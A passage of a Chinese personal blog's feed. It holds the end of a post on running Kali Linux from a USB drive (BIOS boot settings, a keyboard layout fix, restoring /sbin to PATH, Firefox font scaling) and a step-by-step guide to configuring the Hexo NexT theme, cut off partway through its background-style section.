alt="wKioL1Re7gzgKrOGAAC7YqvuJ7o544.jpg"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><blockquote><p>贴上自己的使用经历</p><p>如果不放心的话,可以先选择虚拟机那个</p><p>毕竟”虚拟机”,听着就很安全: )</p></blockquote><h3 id="电脑"><a href="#电脑" class="headerlink" title="电脑"></a>电脑</h3><hr><p>自己的电脑舍不得用,所以把家里的超级老电脑(ThinkPad)搬了出来</p><ol><li><p>开机</p></li><li><p>狂按f12</p></li><li><p>选择usb</p></li><li><p>然后等就行了</p></li></ol><p>这一等就是五六分钟……我都在自己笔记本上开始搜: U盘启动系统卡在初始页面咋办</p><p>不知道是电脑老还是系统在U盘里的原因,开机速度很慢,</p><p>使用的话,比那台老电脑使用win7的时候好点,这是不是说明,我用一台好电脑就行了?</p><hr><p>emmm,试了一下我自己的笔记本(Asus),哇,简直了</p><p>我本来以为和老机一样,直接就可以进了,没想到从f2/esc/f7/f8/f12,tmd一个个按了个遍</p><p>就是没找到U盘启动项在哪里&gt;&lt;</p><ol><li>第一次使用的小伙伴要开机按<strong>f2</strong>进入bios</li><li>进入<strong>security</strong>选项卡,<strong>security boot menu</strong>,然后点击<strong>secure boot control</strong>,把改为<strong>disabled</strong></li><li>进入<strong>boot</strong>选项卡,把<strong>CSM</strong>的什么东西(全称记不住了,反正只有一个),改为<strong>enable</strong></li><li><strong>f10</strong>保存退出</li><li>开机按<strong>f12</strong>进入选择启动项,这时候就有别的选项了,选择自己的U盘,ojbk</li></ol><p>开机比上面的老电脑好多了,至少不会有种完了进不去了的感觉</p><p>使用速度确实比较慢,U盘还是限制了发挥</p><hr><h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><ol><li><p>新建虚拟机,选择自定义</p><p><img src="Snipaste_2020-04-09_18-05-06.png" alt="Snipaste_2020-04-09_18-05-06"></p></li><li><p>过</p><p><img src="Snipaste_2020-04-09_18-05-14.png" alt="Snipaste_2020-04-09_18-05-14"></p></li><li><p>稍后安装操作系统</p><p><img src="Snipaste_2020-04-09_18-05-31.png" alt="Snipaste_2020-04-09_18-05-31"></p></li><li><p>取名和选择版本(随便啦)</p><p><img src="Snipaste_2020-04-09_18-05-35.png" alt="Snipaste_2020-04-09_18-05-35"></p></li><li><p>名称位置(还是随便)</p><p><img src="Snipaste_2020-04-09_18-06-18-1586430144451.png" alt="Snipaste_2020-04-09_18-06-18"></p></li><li><p>使用物理磁盘</p><p><img src="Snipaste_2020-04-09_18-06-42.png" alt="Snipaste_2020-04-09_18-06-42"></p></li><li><p>选择自己U盘的那个设备</p><p><img src="Snipaste_2020-04-09_18-06-49.png" alt="Snipaste_2020-04-09_18-06-49"></p></li><li><p>后面就没啥了</p></li></ol><p>虚拟机是在我的电脑中开的,很流畅,说明确实是电脑问题</p><p>不过开机和我直接装在虚拟机上的kali比,慢了不少</p><p>日常使用,emmm,用的不多还没感受出来</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><blockquote><p>记录我在配置kali时遇到的问题</p></blockquote><h3 id="键盘映射有问题"><a href="#键盘映射有问题" class="headerlink" title="键盘映射有问题"></a>键盘映射有问题</h3><ol><li><p>打开设置界面</p><p><img src="Snipaste_2020-04-09_19-07-45.png" alt="Snipaste_2020-04-09_19-07-45"></p></li></ol><ol start="2"><li><p>键盘</p><p><img src="Snipaste_2020-04-09_19-07-59.png" alt="Snipaste_2020-04-09_19-07-59"></p></li></ol><ol start="3"><li><p>在布局中,加入英语(美国),移到最上面,其他删了还是放着随意</p><p><img src="Snipaste_2020-04-09_19-08-32.png" alt="Snipaste_2020-04-09_19-08-32"></p></li><li><p>记得重启</p></li></ol><h3 id="command-not-found"><a href="#command-not-found" class="headerlink" title="command not found"></a>command not found</h3><p>就在弄上面的键盘时,用到了重启</p><p>所以我试着输入了<code>reboot</code></p><p>oho,没用</p><ol><li><code>echo $PATH</code> 查看一下,路径里有啥,确实没有/sbin</li><li><code>export PATH=$PATH:$HOME/bin:/sbin:/usr/bin:/usr/sbin</code> 增加一些路径</li></ol><p>因为路径里存放着,我们所用到的命令</p><p>从本质上来说,我们所使用的命令就是一个个程序,他们被存放在某个地方</p><p>我们在终端中使用命令时,会从路径中找到那个程序</p><p>我们的情况就是,我们没告诉他路径是什么,所以他找不到</p><p>因此,如果我们知到放在哪里,就可以直接去使用</p><p>eg: <code>reboot</code> 在<code>/sbin</code> 里,所以我们可以使用<code>/sbin/reboot</code> 来重启</p><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><blockquote><p>一些方便使用的,提升使用舒适度的小tip</p></blockquote><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><p>ctrl+alt+t 打开终端</p><p>halt 关机</p><p>reboot 重启</p><h3 id="firefox字体太小"><a href="#firefox字体太小" class="headerlink" title="firefox字体太小"></a>firefox字体太小</h3><p>如果在<strong>菜单</strong>–&gt;<strong>缩放</strong>那里搞的话,只要换个选项卡就又那么小了,所以要来一个一劳永逸的</p><p><img src="Snipaste_2020-04-10_00-26-09.png" alt="Snipaste_2020-04-10_00-26-09"></p><ol><li><p><code>about:config</code></p><p>会跳出这么一个界面</p><p><img src="Snipaste_2020-04-09_23-46-38.png" alt="Snipaste_2020-04-09_23-46-38"></p></li><li><p>当然选择接受风险啦</p></li><li><p>搜索<code>layout.css.devPixelsPerPx</code></p><p>把默认的<code>-1</code>,调成<code>1.5</code></p><p>1.5即150%,可以由着你们自己的感觉调整</p></li><li><p>该页面不会变,但是你可以去别的页面看看</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;带着kali一起走&quot;&gt;&lt;a href=&quot;#带着kali一起走&quot; class=&quot;headerlink&quot; title=&quot;带着kali一起走&quot;&gt;&lt;/a&gt;带着kali一起走&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;本来想装arch的来着,久仰邪教大名&lt;/p&gt;
&lt;p&gt;&lt;co
      
    
    </summary>
    
    
      <category term="linux" scheme="https://mercer5.github.io/categories/linux/"/>
    
    
      <category term="linux" scheme="https://mercer5.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>next主题配置</title>
    <link href="https://mercer5.github.io/2020/04/08/next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/"/>
    <id>https://mercer5.github.io/2020/04/08/next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/</id>
    <published>2020-04-08T05:54:40.000Z</published>
    <updated>2020-08-24T15:30:09.746Z</updated>
    
    <content type="html"><![CDATA[<h1 id="next主题配置"><a href="#next主题配置" class="headerlink" title="next主题配置"></a>next主题配置</h1><h2 id="Scheme"><a href="#Scheme" class="headerlink" title="Scheme"></a>Scheme</h2><p>外观</p><ul><li>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</li><li>Mist - Muse 的紧凑版本，整洁有序的单栏外观</li><li>Pisces - 双栏 Scheme，小家碧玉似的清新</li></ul><p>Scheme 的切换通过更改 <strong>主题配置文件</strong>，搜索 scheme 关键字。 你会看到有三行 scheme 的配置，将你需用启用的 scheme 前面注释符号去除即可。</p><p>eg:选择 Pisces Scheme</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#scheme: Muse</span></span><br><span class="line"><span class="meta">#scheme: Mist</span></span><br><span class="line">scheme: Pisces</span><br></pre></td></tr></table></figure><h2 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h2><p>编辑 <strong>站点配置文件</strong>， 将 <code>language</code> 设置成你所需要的语言。建议明确设置你所需要的语言，例如选用简体中文，配置如下：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">language:</span> <span class="built_in">zh</span>-Hans</span><br></pre></td></tr></table></figure><p>目前支持的语言有</p><table><thead><tr><th align="left">语言</th><th align="left">代码</th><th align="left">设定示例</th></tr></thead><tbody><tr><td align="left">English</td><td align="left"><code>en</code></td><td align="left"><code>language: en</code></td></tr><tr><td align="left">简体中文</td><td align="left"><code>zh-Hans</code></td><td align="left"><code>language: zh-Hans</code></td></tr><tr><td align="left">Français</td><td align="left"><code>fr-FR</code></td><td align="left"><code>language: fr-FR</code></td></tr><tr><td align="left">Português</td><td align="left"><code>pt</code></td><td align="left"><code>language: pt</code> or <code>language: pt-BR</code></td></tr><tr><td align="left">繁體中文</td><td align="left"><code>zh-hk</code> 或者 <code>zh-tw</code></td><td align="left"><code>language: zh-hk</code></td></tr><tr><td align="left">Русский язык</td><td align="left"><code>ru</code></td><td align="left"><code>language: ru</code></td></tr><tr><td align="left">Deutsch</td><td align="left"><code>de</code></td><td align="left"><code>language: de</code></td></tr><tr><td align="left">日本語</td><td align="left"><code>ja</code></td><td align="left"><code>language: ja</code></td></tr><tr><td align="left">Indonesian</td><td align="left"><code>id</code></td><td align="left"><code>language: id</code></td></tr><tr><td align="left">Korean</td><td align="left"><code>ko</code></td><td align="left"><code>language: ko</code></td></tr></tbody></table><h2 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h2><p>菜单配置包括三个部分，第一是菜单项（名称和链接），第二是菜单项的显示文本，第三是菜单项对应的图标。 NexT 使用的是 <a href="http://fontawesome.io/" target="_blank" rel="noopener">Font Awesome</a> 提供的图标</p><p>编辑 <strong>主题配置文件</strong>，修改以下内容：</p><ol><li><p>设定菜单内容，对应的字段是 <code>menu</code>。 菜单内容的设置格式是：<code>item name: link || icon_name</code>。其中 <code>item name</code>是一个名称，这个名称并不直接显示在页面上，她将用于匹配图标以及翻译;icon_name是<strong>font awesome</strong> 的图标名</p><p><strong>这里有一个问题,就是有图标名就没法进入正确的网页;必须把||及后面的删掉才行</strong></p><p>菜单示例配置</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">menu:</span></span><br><span class="line"><span class="symbol">  home:</span> / </span><br><span class="line">  <span class="meta">#about: /about/ </span></span><br><span class="line"><span class="symbol">  tags:</span> <span class="meta-keyword">/tags/</span> </span><br><span class="line"><span class="symbol">  categories:</span> <span class="meta-keyword">/categories/</span> </span><br><span class="line"><span class="symbol">  archives:</span> <span class="meta-keyword">/archives/</span> </span><br><span class="line">  <span class="meta">#schedule: /schedule/ || calendar</span></span><br><span class="line">  <span class="meta">#sitemap: /sitemap.xml || sitemap</span></span><br><span class="line">  <span class="meta">#commonweal: /404/ || heartbeat</span></span><br></pre></td></tr></table></figure><p>除了 <code>home</code>， <code>archives</code> , <code>/</code>后面都需要手动创建这个页面</p><p>NexT 默认的菜单项有（标注 的项表示需要手动创建这个页面）：</p><table><thead><tr><th align="left">键值</th><th align="left">设定值</th><th align="left">显示文本（简体中文）</th></tr></thead><tbody><tr><td align="left">home</td><td align="left"><code>home: /</code></td><td align="left">主页</td></tr><tr><td align="left">archives</td><td align="left"><code>archives: /archives</code></td><td align="left">归档页</td></tr><tr><td align="left">categories</td><td align="left"><code>categories: /categories</code></td><td align="left">分类页</td></tr><tr><td align="left">tags</td><td align="left"><code>tags: /tags</code></td><td align="left">标签页</td></tr><tr><td align="left">about</td><td align="left"><code>about: /about</code></td><td align="left">关于页面</td></tr><tr><td align="left">commonweal</td><td align="left"><code>commonweal: /404.html</code></td><td align="left">公益 404</td></tr></tbody></table></li><li><p>设置菜单项的显示文本。在第一步中设置的菜单的名称并不直接用于界面上的展示。Hexo 在生成的时候将使用 这个名称查找对应的语言翻译，并提取显示文本。这些翻译文本放置在 NexT 主题目录下的 <code>languages/{language}.yml</code> （<code>{language}</code> 为你所使用的语言）。</p><p>以简体中文为例，若你需要添加一个菜单项，比如 <code>something</code>。那么就需要修改简体中文对应的翻译文件 <code>languages/zh-Hans.yml</code>，在 <code>menu</code> 字段下添加一项：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">menu:</span></span><br><span class="line"><span class="symbol">  home:</span> 首页</span><br><span class="line"><span class="symbol">  archives:</span> 归档</span><br><span class="line"><span class="symbol">  categories:</span> 分类</span><br><span class="line"><span class="symbol">  tags:</span> 标签</span><br><span class="line"><span class="symbol">  about:</span> 关于</span><br><span class="line"><span class="symbol">  search:</span> 搜索</span><br><span class="line"><span class="symbol">  commonweal:</span> 公益<span class="number">404</span></span><br><span class="line"><span class="symbol">  something:</span> 有料</span><br></pre></td></tr></table></figure></li><li><p>设定菜单项的图标，对应的字段是 <code>menu_icons</code>。<code>enable</code> 可用于控制是否显示图标，你可以设置成 <code>false</code> 来去掉图标。</p><p>菜单图标配置示例</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu_icons:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>在菜单图标开启的情况下，如果菜单项与菜单未匹配（没有设置或者无效的 Font Awesome 图标名字） 的情况下，NexT 将会使用 作为图标。</p></li></ol><h2 id="侧栏"><a href="#侧栏" class="headerlink" title="侧栏"></a>侧栏</h2><h3 id="主体"><a href="#主体" class="headerlink" title="主体"></a>主体</h3><p>默认情况下，侧栏仅在文章页面（拥有目录列表）时才显示，并放置于右侧位置。 可以通过修改 <strong>主题配置文件</strong> 中的 <code>sidebar</code> 字段来控制侧栏的行为。侧栏的设置包括两个部分，其一是侧栏的位置， 其二是侧栏显示的时机。</p><ol><li><p>设置侧栏的位置，修改 <code>sidebar.position</code> 的值，支持的选项有：</p><ul><li>left - 靠左放置</li><li>right - 靠右放置</li></ul><p>目前仅 Pisces Scheme 支持 <code>position</code> 配置。</p></li><li><p>设置侧栏显示的时机，修改 <code>sidebar.display</code> 的值，支持的选项有：</p><ul><li><code>post</code> - 默认行为，在文章页面（拥有目录列表）时显示</li><li><code>always</code> - 在所有页面中都显示</li><li><code>hide</code> - 在所有页面中都隐藏（可以手动展开）</li><li><code>remove</code> - 完全移除</li></ul><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">sidebar:</span></span><br><span class="line">  <span class="meta"># Sidebar Position, available value: left | right (only for Pisces | Gemini).</span></span><br><span class="line"><span class="symbol">  position:</span> left</span><br><span class="line">  <span class="meta">#position: right</span></span><br><span class="line"></span><br><span class="line">  Sidebar Display, available value (only for Muse | Mist):</span><br><span class="line">  </span><br><span class="line">  <span class="meta">#display: post    <span class="comment">// 默认显示方式</span></span></span><br><span class="line">  <span class="meta">#display: always  <span class="comment">// 一直显示</span></span></span><br><span class="line"><span class="symbol">  display:</span> hide     <span class="comment">// 初始隐藏</span></span><br><span class="line">  <span class="meta">#display: remove  <span class="comment">// 移除侧边栏</span></span></span><br></pre></td></tr></table></figure></li></ol><h3 id="社交链接"><a href="#社交链接" class="headerlink" title="社交链接"></a>社交链接</h3><p>打开 <code>themes/next/_config.yml</code> 文件,搜索关键字 <code>social</code> ,然后添加社交站点名称与地址即可。</p><h3 id="社交图标"><a href="#社交图标" class="headerlink" title="社交图标"></a>社交图标</h3><p>打开 <code>themes/next/_config.yml</code> 文件,搜索关键字 <code>social_icons</code> ，添加社交站点名称（注意大小写）图标，<a href="http://fontawesome.dashgame.com/" target="_blank" rel="noopener">Font Awesome</a>图标地。</p><h2 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h2><p>编辑 <strong>主题配置文件</strong>， 修改字段 <code>avatar</code>,删掉前面的#号,值设置成头像的链接地址。其中，头像的链接地址可以是：</p><table><thead><tr><th align="left">地址</th><th align="left">值</th></tr></thead><tbody><tr><td align="left">完整的互联网 URI</td><td align="left"><code>http://example.com/avatar.png</code></td></tr><tr><td align="left">站点内的地址</td><td align="left">将头像放置主题目录下的 <code>source/uploads/</code> （新建 uploads 目录若不存在） 配置为：<code>avatar: /uploads/avatar.png</code>或者 放置在 <code>source/images/</code> 目录下 配置为：<code>avatar: /images/avatar.png</code></td></tr></tbody></table><h2 id="添加分类和标签"><a href="#添加分类和标签" class="headerlink" title="添加分类和标签"></a>添加分类和标签</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="生成“分类”页并添加tpye属性"><a href="#生成“分类”页并添加tpye属性" class="headerlink" title="生成“分类”页并添加tpye属性"></a>生成“分类”页并添加tpye属性</h4><p>打开命令行，进入博客所在文件夹。执行命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new<span class="built_in"> page </span>categories</span><br></pre></td></tr></table></figure><p>成功后会提示：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INFO  <span class="string">Created:</span> <span class="regexp">~/Documents/</span>blog<span class="regexp">/source/</span>categories/index.md</span><br></pre></td></tr></table></figure><p>根据上面的路径，找到<code>index.md</code>这个文件，打开后默认内容是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-10</span> <span class="number">12</span><span class="string">:51:51</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>添加<code>type: &quot;categories&quot;</code>到内容中，添加后是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-10</span> <span class="number">12</span><span class="string">:51:51</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">"categories"</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>保存并关闭文件。</p><h4 id="给文章添加“categories”属性"><a href="#给文章添加“categories”属性" class="headerlink" title="给文章添加“categories”属性"></a>给文章添加“categories”属性</h4><p>打开需要添加分类的文章，为其添加categories属性。下方的<code>categories: web前端</code>表示添加这篇文章到“web前端”这个分类。注意：hexo一篇文章只能属于一个分类，也就是说如果在“- web前端”下方添加“-xxx”，hexo不会产生两个分类，而是把分类嵌套（即该文章属于 “- web前端”下的 “-xxx ”分类）。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">aircrack-ng</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-10</span> <span class="number">19</span><span class="string">:35:51</span></span><br><span class="line"><span class="attr">categories:</span> <span class="string">虚拟机</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。当然，只有添加了<code>categories: xxx</code>的文章才会被收录到首页的“分类”中。</p><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><h4 id="生成“标签”页并添加tpye属性"><a href="#生成“标签”页并添加tpye属性" class="headerlink" title="生成“标签”页并添加tpye属性"></a>生成“标签”页并添加tpye属性</h4><p>打开命令行，进入博客所在文件夹。执行命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new<span class="built_in"> page </span>tags</span><br></pre></td></tr></table></figure><p>成功后会提示：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INFO  <span class="string">Created:</span> <span class="regexp">~/Documents/</span>blog<span class="regexp">/source/</span>tags/index.md</span><br></pre></td></tr></table></figure><p>根据上面的路径，找到<code>index.md</code>这个文件，打开后默认内容是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">tages</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-14</span> <span class="number">10</span><span class="string">:51:06</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>添加<code>type: &quot;tags&quot;</code>到内容中，添加后是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">tages</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-14</span> <span class="number">10</span><span class="string">:51:06</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">"tags"</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>保存并关闭文件。</p><h4 id="给文章添加“tags”属性"><a href="#给文章添加“tags”属性" class="headerlink" title="给文章添加“tags”属性"></a>给文章添加“tags”属性</h4><p>打开需要添加标签的文章，为其添加tags属性。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">aircrack-ng</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-10</span> <span class="number">19</span><span class="string">:35:51</span></span><br><span class="line"><span class="attr">categories:</span> <span class="string">虚拟机</span></span><br><span class="line"><span class="attr">tags:</span>   <span class="string">//标签</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">安全</span>   <span class="string">//在这里!!</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>至此，成功给文章添加分类，点击首页的“标签”可以看到该标签下的所有文章。当然，只有添加了<code>tags: xxx</code>的文章才会被收录到首页的“标签”中。</p><h2 id="不显示全文"><a href="#不显示全文" class="headerlink" title="不显示全文"></a>不显示全文</h2><p>编辑 <strong>主题配置文件</strong>， 修改字段 <code>auto_excerpt</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_excerpt:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">length:</span> <span class="number">100</span></span><br></pre></td></tr></table></figure><p><code>enable: true</code>:表示不完全显示</p><p><code>length: 100</code>:表示只显示100字</p><h2 id="友链"><a href="#友链" class="headerlink" title="友链"></a>友链</h2><p>编辑 <strong>主题配置文件</strong>， 修改字段 <code>Blog rolls</code></p><p>自己往下填就是了</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Blog rolls</span></span><br><span class="line"><span class="symbol">links_title:</span> 友情链接 <span class="meta">#标题</span></span><br><span class="line"><span class="symbol">links_layout:</span> block <span class="meta">#布局，一行一个连接</span></span><br><span class="line"><span class="meta">#links_layout: inline</span></span><br><span class="line"><span class="symbol">links:</span> <span class="meta">#连接</span></span><br><span class="line"><span class="symbol">  baidu:</span> http:<span class="comment">//example.com/</span></span><br><span class="line"><span class="symbol">  google:</span> http:<span class="comment">//example.com/</span></span><br></pre></td></tr></table></figure><h2 id="显示当前浏览进度"><a href="#显示当前浏览进度" class="headerlink" title="显示当前浏览进度"></a>显示当前浏览进度</h2><p>打开 <code>themes/next/_config.yml</code> ,搜索关键字 <code>scrollpercent</code> ,把 <code>false</code> 改为 <code>true</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Scroll percent label in b2t button</span></span><br><span class="line">scrollpercent: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>如果想把 <code>top</code>按钮放在侧边栏,打开 <code>themes/next/_config.yml</code> ,搜索关键字 <code>b2t</code> ,把 <code>false</code> 改为 <code>true</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Back to top in sidebar</span></span><br><span class="line"> b2t: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># Scroll percent label in b2t button</span></span><br><span class="line"> scrollpercent: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="统计功能"><a href="#统计功能" class="headerlink" title="统计功能"></a>统计功能</h2><p>在站点的根目录下：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm i --save hexo-wordcount</span><br></pre></td></tr></table></figure><p>打开 <code>themes/next/_config.yml</code> ，搜索关键字 <code>post_wordcount</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Post wordcount display settings</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/willin/hexo-wordcount</span></span><br><span class="line">post_wordcount:</span><br><span class="line">  item_text: <span class="literal">true</span></span><br><span class="line">  <span class="comment">#字数统计</span></span><br><span class="line">  wordcount: <span class="literal">true</span></span><br><span class="line">  <span class="comment">#预览时间</span></span><br><span class="line">  min2read: <span class="literal">true</span></span><br><span class="line">  <span class="comment">#总字数,显示在页面底部</span></span><br><span class="line">  totalcount: <span class="literal">true</span></span><br><span class="line">  separated_meta: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="加载条"><a href="#加载条" class="headerlink" title="加载条"></a>加载条</h2><p>打开 <code>themes/next/_config.yml</code> ，搜索关键字 <code>pace</code>：</p><p>pace改为true</p><p>pace_theme后面选上面#后面中的一个</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Progress bar in the top during page loading.</span></span><br><span class="line">pace: <span class="literal">true</span></span><br><span class="line"><span class="meta"># Themes list:</span></span><br><span class="line"><span class="meta">#pace-theme-big-counter</span></span><br><span class="line"><span class="meta">#pace-theme-bounce</span></span><br><span class="line"><span class="meta">#pace-theme-barber-shop</span></span><br><span class="line"><span class="meta">#pace-theme-center-atom</span></span><br><span class="line"><span class="meta">#pace-theme-center-circle</span></span><br><span class="line"><span class="meta">#pace-theme-center-radar</span></span><br><span class="line"><span class="meta">#pace-theme-center-simple</span></span><br><span class="line"><span class="meta">#pace-theme-corner-indicator</span></span><br><span class="line"><span class="meta">#pace-theme-fill-left</span></span><br><span class="line"><span class="meta">#pace-theme-flash</span></span><br><span class="line"><span class="meta">#pace-theme-loading-bar</span></span><br><span class="line"><span class="meta">#pace-theme-mac-osx</span></span><br><span class="line"><span class="meta">#pace-theme-minimal</span></span><br><span class="line"><span class="meta"># For example</span></span><br><span class="line"><span class="meta"># pace_theme: pace-theme-center-simple</span></span><br><span class="line">pace_theme: pace-theme-center-simple</span><br></pre></td></tr></table></figure><h2 id="背景样式"><a href="#背景样式" class="headerlink" title="背景样式"></a>背景样式</h2><p>打开 <code>themes/next/_config.yml</code> ，搜索关键字 <code>pace</code>：</p><p>四个选一个,改动true/false</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 